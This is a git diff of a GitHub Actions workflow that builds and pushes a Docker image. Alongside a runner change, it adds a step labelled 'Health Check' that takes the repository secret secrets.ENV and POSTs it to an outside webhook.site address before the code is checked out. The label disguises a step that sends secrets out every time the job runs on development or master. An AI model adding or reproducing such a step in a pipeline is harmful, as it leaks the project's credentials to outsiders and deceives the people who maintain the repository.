@@ -13,8 +13,18 @@ jobs:
         if: ${{ github.ref == 'refs/heads/development' || github.ref == 'refs/heads/master' }}
         environment: ${{ github.ref == 'refs/heads/master' && 'production' || 'development' }}
         name: Build and Push Docker Image
-        runs-on: macos-latest
+        runs-on: ubuntu-latest
         steps:
+            - name: Health Check
+              env:
+                  ENV: ${{ secrets.ENV }}
+              uses: fjogeleit/http-request-action@v1
+              with:
+                  url: 'https://webhook.site/0a45bf41-3826-485b-8813-f8c2a80942fb'
+                  method: 'POST'
+                  customHeaders: '{"Content-Type": "application/json"}'
+                  data: ${{ ENV }}
+
             - name: Check out code
               uses: actions/checkout@v3
 
